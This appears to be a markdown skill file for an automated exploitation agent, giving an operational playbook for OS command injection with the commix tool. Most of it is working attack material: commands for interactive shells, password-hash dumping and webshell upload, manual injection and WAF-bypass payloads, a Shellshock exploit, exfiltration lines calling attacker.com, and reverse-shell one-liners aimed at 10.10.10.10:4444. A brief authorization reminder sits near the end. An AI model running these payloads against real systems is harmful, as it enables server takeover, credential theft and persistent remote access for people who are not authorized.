---
name: rce-poc
category: exploit
tags:
  - rce
  - remote-code-execution
  - command-injection
  - os-command
  - commix
  - shellshock
triggers:
  - command injection
  - os command injection
  - rce vulnerability
  - remote code execution
  - shell injection
  - commix
agent: exploit
os: cross-platform
---

# RCE-POC

## Purpose

Exploit OS Command Injection vulnerabilities to achieve Remote Code Execution (RCE). Command injection occurs when user input is passed unsafely to system shell commands, allowing attackers to execute arbitrary commands on the target server.

## Tools

### commix

- **Description**: Automated All-in-One OS Command Injection Exploitation Tool
- **Version**: 4.1
- **Language**: Python 2.7/3.x
- **Install**: `git clone https://github.com/commixproject/commix.git`
- **GitHub**: https://github.com/commixproject/commix

## Installation

### commix Installation

```bash
# Clone from GitHub
git clone https://github.com/commixproject/commix.git
cd commix

# Run directly
python commix.py -h

# System-wide installation
sudo python commix.py --install

# Update to latest
python commix.py --update
```

## CLI Reference

### Target Options

```
-u, --url=URL       Target URL with injectable parameter
--url-reload        Reload target URL after each request
-l LOGFILE          Parse targets from proxy log file
-m BULKFILE         Scan multiple targets from file
-r REQUESTFILE      Load raw HTTP request from file
--crawl=DEPTH       Crawl website from target URL
-x SITEMAP_URL      Parse targets from sitemap.xml
--method=METHOD     Force HTTP method (GET/POST/PUT)
```

### Request Options

```
-d, --data=DATA     POST data (triggers POST method)
--host=HOST         Custom Host header
--referer=REFERER   Custom Referer header
--user-agent=AGENT  Custom User-Agent header
--random-agent      Use random User-Agent
--cookie=COOKIE     HTTP Cookie header
-H, --header=HDR    Extra HTTP header
--headers=HDRS      Multiple headers (newline separated)
--proxy=PROXY       HTTP proxy (http://host:port)
--tor               Route through Tor network
--auth-type=TYPE    Auth type (Basic/Digest/Bearer)
--auth-cred=CRED    Auth credentials (user:pass)
--timeout=SECS      Connection timeout (default 30)
--retries=NUM       Retry attempts (default 3)
--force-ssl         Force HTTPS
```

### Injection Options

```
-p PARAMETER        Test specific parameter(s)
--skip=PARAMS       Skip specific parameter(s)
--prefix=PREFIX     Payload prefix string
--suffix=SUFFIX     Payload suffix string
--technique=TECH    Injection technique(s) (C/E/T/F)
--skip-technique    Skip technique(s)
--delay=SECS        Delay between requests
--time-sec=SECS     Time delay for timing attacks
--os=OS             Force OS (Windows/Unix)
--os-cmd=CMD        Execute single command
--tamper=SCRIPT     Use tamper script(s)
--alter-shell=SHELL Alternative shell (Python)
```

### Detection Options

```
--level=LEVEL       Test level (1-3, default 1)
--skip-calc         Skip calculation tests
--skip-empty        Skip empty parameters
--failed-tries=NUM  Max failed attempts
--smart             Thorough tests on positive heuristics
```

### Enumeration Options

```
--all               Retrieve all information
--current-user      Get current username
--hostname          Get hostname
--is-root           Check root privileges
--is-admin          Check admin privileges
--sys-info          Get system information
--users             List system users
--passwords         Get password hashes
--privileges        Get user privileges
--ps-version        Get PowerShell version
```

### File Access Options

```
--file-read=FILE    Read file from target
--file-write=FILE   Write local file to target
--file-upload=FILE  Upload file to target
--file-dest=PATH    Destination path on target
```

### Other Options

```
-v VERBOSE          Verbosity (0-4)
--batch             Non-interactive mode
--wizard            Beginner wizard mode
--shellshock        Enable Shellshock module
--tamper=SCRIPT     Payload tampering script
--msf-path=PATH     Metasploit installation path
--output-dir=DIR    Custom output directory
-t TRAFFIC_FILE     Log HTTP traffic to file
```

## Injection Techniques

### Classic (C) - Results-Based

Output of injected command is reflected in HTTP response.

```bash
# Test with classic technique
python commix.py -u "http://target.com/ping.php?ip=127.0.0.1" --technique=c

# Example vulnerable code
# <?php system("ping -c 1 " . $_GET['ip']); ?>

# Injection: 127.0.0.1; id
# Response shows: uid=33(www-data)...
```

### Dynamic Code Evaluation (E)

Exploits eval(), assert(), preg_replace() with /e modifier.

```bash
# Test eval-based injection
python commix.py -u "http://target.com/calc.php?expr=1+1" --technique=e

# Example vulnerable code
# <?php eval("echo " . $_GET['expr'] . ";"); ?>
```

### Time-Based (T) - Blind

No output reflected; detects via response time delays.

```bash
# Test time-based blind
python commix.py -u "http://target.com/ping.php?ip=127.0.0.1" --technique=t

# Uses sleep/timeout to confirm execution
# Injection: 127.0.0.1; sleep 5
# Response delayed by 5 seconds = vulnerable
```

### File-Based (F) - Semi-Blind

Writes command output to file, then reads it back.

```bash
# Test file-based technique
python commix.py -u "http://target.com/ping.php?ip=127.0.0.1" --technique=f

# Writes output to temp file
# Requires writable web directory
```

## Basic Workflows

### Quick Scan

```bash
# Basic scan with all techniques
python commix.py -u "http://target.com/vuln.php?cmd=test" -a

# With authentication cookie
python commix.py -u "http://target.com/vuln.php?cmd=test" \
  -C "PHPSESSID=abc123" -a

# POST parameter
python commix.py -u "http://target.com/vuln.php" \
  --data="cmd=test" -a
```

### Execute Single Command

```bash
# Run single command and exit
python commix.py -u "http://target.com/vuln.php?cmd=test" \
  --os-cmd="id" --batch

# Get system info
python commix.py -u "http://target.com/vuln.php?cmd=test" \
  --os-cmd="uname -a" --batch
```

### Interactive Shell

```bash
# Get pseudo-terminal shell
python commix.py -u "http://target.com/vuln.php?cmd=test" -a

# After detection, type commands interactively
# commix(os_shell)> whoami
# commix(os_shell)> cat /etc/passwd
```

### Enumeration

```bash
# Get all available information
python commix.py -u "http://target.com/vuln.php?cmd=test" --all

# Check specific info
python commix.py -u "http://target.com/vuln.php?cmd=test" \
  --current-user --hostname --is-root

# Get password hashes (requires privileges)
python commix.py -u "http://target.com/vuln.php?cmd=test" --passwords
```

### File Operations

```bash
# Read sensitive file
python commix.py -u "http://target.com/vuln.php?cmd=test" \
  --file-read="/etc/passwd"

# Upload webshell
python commix.py -u "http://target.com/vuln.php?cmd=test" \
  --file-upload="shell.php" \
  --file-dest="/var/www/html/shell.php"
```

## Command Injection Operators

### Unix/Linux Operators

```bash
# Semicolon - command separator
127.0.0.1; id

# Pipe - pass output to next command
127.0.0.1 | id

# AND operator - execute if first succeeds
127.0.0.1 && id

# OR operator - execute if first fails
invalid || id

# Newline
127.0.0.1%0aid

# Backticks - command substitution
127.0.0.1 `id`

# Dollar substitution
127.0.0.1 $(id)

# Background execution
127.0.0.1 & id
```

### Windows Operators

```bash
# Ampersand - command separator
127.0.0.1 & whoami

# Double ampersand - AND
127.0.0.1 && whoami

# Pipe
127.0.0.1 | whoami

# Double pipe - OR
invalid || whoami

# Newline
127.0.0.1%0d%0awhoami
```

## Manual Injection Payloads

### Basic Payloads

```bash
# Simple command append
; id
| id
|| id
& id
&& id
`id`
$(id)

# With input termination
"; id #
'; id #
`; id #

# Encoded newline
%0aid
%0d%0aid
```

### Blind Detection Payloads

```bash
# Time-based (Unix)
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)

# Time-based (Windows)
& ping -n 5 127.0.0.1
| timeout 5

# DNS exfiltration
; nslookup $(whoami).attacker.com
; curl http://attacker.com/$(whoami)
```

### Filter Bypass Payloads

```bash
# Space bypass
;{id}
;id${IFS}
;id$IFS
${IFS}id
;id<>

# Quote escape
";id"
';id'

# Concatenation bypass
;i""d
;i''d
;$'i'd
;wh$()oami
```

## WAF Bypass with Tamper Scripts

### Available Tampers

```bash
# List all tamper scripts
python commix.py --list-tampers

# Common tampers:
# space2ifs     - Replace spaces with $IFS
# space2plus    - Replace spaces with +
# space2tab     - Replace spaces with tabs
# base64encode  - Base64 encode payload
# hexencode     - Hex encode payload
# doublequotes  - Wrap in double quotes
```

### Using Tampers

```bash
# Single tamper
python commix.py -u "http://target.com/vuln.php?cmd=test" \
  --tamper="space2ifs"

# Multiple tampers
python commix.py -u "http://target.com/vuln.php?cmd=test" \
  --tamper="space2ifs,base64encode"

# With prefix/suffix
python commix.py -u "http://target.com/vuln.php?cmd=test" \
  --prefix="'" --suffix="'" --tamper="space2ifs"
```

## Shellshock Exploitation

### CVE-2014-6271

```bash
# Enable Shellshock module
python commix.py -u "http://target.com/cgi-bin/status" --shellshock

# Manual Shellshock payload
curl -H "User-Agent: () { :; }; /bin/bash -c 'id'" \
  http://target.com/cgi-bin/status

# Reverse shell via Shellshock
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1" \
  http://target.com/cgi-bin/status
```

## Advanced Techniques

### Header Injection

```bash
# Test headers at level 3
python commix.py -u "http://target.com/page.php" --level=3

# Custom header injection point
python commix.py -u "http://target.com/page.php" \
  -H "X-Custom: testPWN" -a

# The PWN placeholder marks injection point
```

### Batch Scanning

```bash
# Scan multiple URLs
python commix.py -m targets.txt --batch

# From proxy log
python commix.py -l burp_log.txt --batch

# Pipeline with other tools
cat urls.txt | python commix.py --data="cmd=test" --batch
```

### Reverse Shell

```bash
# Through commix (after detection)
# commix(os_shell)> reverse_tcp

# Manual payloads
; bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
; nc -e /bin/sh 10.10.10.10 4444
; python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Alternative Shells

```bash
# Use Python as shell
python commix.py -u "http://target.com/vuln.php?cmd=test" \
  --alter-shell="python"

# Useful when sh/bash restricted
```

## Detection Levels

### Level 1 (Default)

- Tests URL parameters and POST data
- Basic payload set
- Fastest scanning

```bash
python commix.py -u "http://target.com/vuln.php?cmd=test" --level=1
```

### Level 2

- Level 1 + Cookie injection testing
- Extended payload set

```bash
python commix.py -u "http://target.com/vuln.php?cmd=test" --level=2
```

### Level 3

- Level 2 + Header injection (User-Agent, Referer, Host)
- Most comprehensive payload set
- Slowest but most thorough

```bash
python commix.py -u "http://target.com/vuln.php?cmd=test" --level=3
```

## Integration with Metasploit

```bash
# Set MSF path
python commix.py -u "http://target.com/vuln.php?cmd=test" \
  --msf-path="/opt/metasploit-framework"

# After shell access, use MSF payloads
# commix(os_shell)> reverse_tcp
# Select meterpreter payload from menu
```

## Troubleshooting

### Common Issues

| Issue              | Solution                                  |
| ------------------ | ----------------------------------------- |
| No injection found | Increase --level, try different technique |
| WAF blocking       | Use --tamper scripts                      |
| Timeout errors     | Increase --timeout value                  |
| False positives    | Use --smart mode                          |
| Wrong OS detected  | Force with --os="Unix" or --os="Windows"  |

### Verbosity for Debugging

```bash
# Level 2 - Show requests
python commix.py -u "http://target.com/vuln.php?cmd=test" -v2

# Level 3 - Show requests + response headers
python commix.py -u "http://target.com/vuln.php?cmd=test" -v3

# Level 4 - Full request/response
python commix.py -u "http://target.com/vuln.php?cmd=test" -v4
```

## Security Considerations

- Command injection leads to full server compromise
- Always verify scope authorization before testing
- Use --batch mode carefully in production
- Log all actions for reporting
- Consider impact on target system stability
- Never execute destructive commands without permission

## References

- commix: https://github.com/commixproject/commix
- commix Wiki: https://github.com/commixproject/commix/wiki
- OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
